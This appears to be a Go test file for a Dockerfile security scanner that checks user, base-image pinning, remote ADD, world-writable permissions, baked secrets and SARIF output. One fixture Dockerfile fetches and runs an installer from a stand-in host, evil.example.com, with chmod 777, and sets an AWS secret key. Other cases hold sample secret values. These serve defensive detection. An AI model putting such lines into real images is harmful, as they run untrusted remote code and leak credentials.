package scan

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"
)

const dfHardened = `# a well-authored image
FROM golang:1.23@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa AS build
WORKDIR /src
COPY . .
RUN go build -o /app ./cmd

FROM gcr.io/distroless/static@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
COPY --from=build --chown=65532:65532 /app /app
USER 65532:65532
HEALTHCHECK CMD ["/app", "-healthcheck"]
ENTRYPOINT ["/app"]
`

const dfWideOpen = `FROM ubuntu:latest
RUN apt-get update && apt-get install -y curl
ADD https://evil.example.com/installer.sh /tmp/installer.sh
RUN chmod 777 /tmp/installer.sh && /tmp/installer.sh
ENV AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
CMD ["/bin/bash"]
`

const dfNoUserNoTag = `FROM node
COPY . /app
CMD ["node", "/app/index.js"]
`

func TestSpecFromDockerfile_Hardened(t *testing.T) {
	s, err := SpecFromDockerfile([]byte(dfHardened), "Dockerfile")
	if err != nil {
		t.Fatal(err)
	}
	if s.Stages != 2 {
		t.Errorf("stages=%d want 2", s.Stages)
	}
	if s.FinalUser != "65532:65532" {
		t.Errorf("FinalUser=%q want 65532:65532", s.FinalUser)
	}
	if s.BasePin != "digest" {
		t.Errorf("BasePin=%q want digest", s.BasePin)
	}
	if !s.Healthcheck {
		t.Error("HEALTHCHECK not detected")
	}
	if len(s.Secrets) != 0 || len(s.RemoteADD) != 0 || len(s.WorldWritable) != 0 {
		t.Errorf("unexpected findings: %+v", s)
	}
	r := ScoreDockerfile(s)
	if r.Grade != "A" || r.Score != 100 {
		t.Errorf("hardened Dockerfile scored %d/%s, want 100/A", r.Score, r.Grade)
	}
}

func TestSpecFromDockerfile_WideOpen(t *testing.T) {
	s, err := SpecFromDockerfile([]byte(dfWideOpen), "Dockerfile")
	if err != nil {
		t.Fatal(err)
	}
	if s.FinalUser != "" {
		t.Errorf("FinalUser=%q want empty (root default)", s.FinalUser)
	}
	if s.BasePin != "latest" {
		t.Errorf("BasePin=%q want latest", s.BasePin)
	}
	if len(s.RemoteADD) != 1 {
		t.Errorf("RemoteADD=%v want 1", s.RemoteADD)
	}
	if len(s.WorldWritable) != 1 {
		t.Errorf("WorldWritable=%v want 1", s.WorldWritable)
	}
	if len(s.Secrets) != 1 || s.Secrets[0] != "AWS_SECRET_ACCESS_KEY" {
		t.Errorf("Secrets=%v want [AWS_SECRET_ACCESS_KEY]", s.Secrets)
	}
	r := ScoreDockerfile(s)
	if r.Grade != "F" {
		t.Errorf("wide-open Dockerfile graded %s (%d), want F", r.Grade, r.Score)
	}
}

func TestSpecFromDockerfile_NoUserNoTag(t *testing.T) {
	s, err := SpecFromDockerfile([]byte(dfNoUserNoTag), "Dockerfile")
	if err != nil {
		t.Fatal(err)
	}
	if s.BasePin != "latest" {
		t.Errorf("BasePin=%q want latest (implicit :latest on `node`)", s.BasePin)
	}
	r := ScoreDockerfile(s)
	if dimByKey(r, "dockerfile.user").Verdict != VerdictFail {
		t.Error("no USER should FAIL (root default)")
	}
	if dimByKey(r, "dockerfile.base.pinned").Verdict != VerdictFail {
		t.Error("implicit :latest should FAIL")
	}
}

func TestGradeDfBase_Table(t *testing.T) {
	cases := []struct {
		ref     string
		wantPin string
		wantV   Verdict
	}{
		{"alpine@sha256:deadbeef", "digest", VerdictPass},
		{"scratch", "scratch", VerdictPass},
		{"alpine:3.19", "tag", VerdictWarn},
		{"alpine:latest", "latest", VerdictFail},
		{"alpine", "latest", VerdictFail},
		{"registry.example.com:5000/team/app:1.2", "tag", VerdictWarn},
		{"registry.example.com:5000/team/app", "latest", VerdictFail},
	}
	for _, c := range cases {
		if got := classifyPin(c.ref); got != c.wantPin {
			t.Errorf("classifyPin(%q)=%q want %q", c.ref, got, c.wantPin)
		}
		_, v, _ := gradeDfBase(DockerfileSpec{BaseImage: c.ref, BasePin: classifyPin(c.ref)})
		if v != c.wantV {
			t.Errorf("gradeDfBase(%q) verdict=%s want %s", c.ref, v, c.wantV)
		}
	}
}

func TestSpecFromDockerfile_DistrolessNonrootNoUser(t *testing.T) {
	df := "FROM gcr.io/distroless/static:nonroot\nCOPY app /app\nHEALTHCHECK CMD [\"/app\"]\n"
	s, err := SpecFromDockerfile([]byte(df), "Dockerfile")
	if err != nil {
		t.Fatal(err)
	}
	if !s.BaseLooksNonRoot {
		t.Error("distroless :nonroot base should be flagged non-root")
	}
	r := ScoreDockerfile(s)
	// No explicit USER but a nonroot base: partial credit (WARN), not a hard FAIL.
	if d := dimByKey(r, "dockerfile.user"); d.Verdict != VerdictWarn {
		t.Errorf("nonroot base without USER graded %s, want WARN", d.Verdict)
	}
}

func TestSpecFromDockerfile_Errors(t *testing.T) {
	if _, err := SpecFromDockerfile([]byte("# just a comment\nRUN echo hi\n"), "Dockerfile"); err == nil {
		t.Error("expected error when there is no FROM instruction")
	}
}

func TestSpecFromDockerfile_LineContinuation(t *testing.T) {
	df := "FROM debian:12\n" +
		"RUN apt-get update \\\n" +
		"  && apt-get install -y curl \\\n" +
		"  && chmod 777 /opt\n"
	s, err := SpecFromDockerfile([]byte(df), "Dockerfile")
	if err != nil {
		t.Fatal(err)
	}
	if len(s.WorldWritable) != 1 {
		t.Errorf("continuation-joined RUN should surface chmod 777: %+v", s.WorldWritable)
	}
	if len(s.DirtyPkg) != 1 {
		t.Errorf("apt install with no cache prune should be flagged dirty; DirtyPkg=%v", s.DirtyPkg)
	}
}

func TestScoreDockerfile_CeilingNote(t *testing.T) {
	s, _ := SpecFromDockerfile([]byte(dfHardened), "Dockerfile")
	r := ScoreDockerfile(s)
	found := false
	for _, n := range r.Notes {
		if strings.Contains(n, "runtime scan") {
			found = true
		}
	}
	if !found {
		t.Error("report must carry the honest static-ceiling note pointing at a runtime scan")
	}
}

func TestSpecFromDockerfile_SecretHeuristics(t *testing.T) {
	cases := []struct {
		line   string
		secret bool
	}{
		{"ENV API_KEY=sk_live_abc123", true},
		{"ENV DB_PASSWORD=hunter2", true},
		{`ARG GITHUB_TOKEN="ghp_xxx"`, true},
		{"ENV PATH=/usr/local/bin", false},    // not a secret key
		{"ENV SECRET_KEY=${INJECTED}", false}, // build-arg reference, not baked
		{"ARG BUILD_SECRET", false},           // declaration only, no value
		{"ENV LANG en_US.UTF-8", false},       // legacy form, not a secret
	}
	for _, c := range cases {
		df := "FROM alpine:3.19\n" + c.line + "\n"
		s, err := SpecFromDockerfile([]byte(df), "Dockerfile")
		if err != nil {
			t.Fatal(err)
		}
		got := len(s.Secrets) > 0
		if got != c.secret {
			t.Errorf("%q: secret=%v want %v (secrets=%v)", c.line, got, c.secret, s.Secrets)
		}
	}
}

func TestRenderSARIFDockerfile(t *testing.T) {
	s, _ := SpecFromDockerfile([]byte(dfWideOpen), "Dockerfile")
	r := ScoreDockerfile(s)
	var buf bytes.Buffer
	if err := RenderSARIFDockerfile(&buf, r, SARIFOptions{ConfigFile: "Dockerfile"}); err != nil {
		t.Fatal(err)
	}
	var log map[string]any
	if err := json.Unmarshal(buf.Bytes(), &log); err != nil {
		t.Fatalf("SARIF is not valid JSON: %v", err)
	}
	if !strings.Contains(buf.String(), "dockerfile.user") {
		t.Error("SARIF should carry the dockerfile.user rule")
	}
	// A clean report must still marshal results as [] (not null).
	cs, _ := SpecFromDockerfile([]byte(dfHardened), "Dockerfile")
	var clean bytes.Buffer
	if err := RenderSARIFDockerfile(&clean, ScoreDockerfile(cs), SARIFOptions{ConfigFile: "Dockerfile"}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(clean.String(), `"results": []`) {
		t.Error("clean Dockerfile SARIF must emit results: [] not null")
	}
}
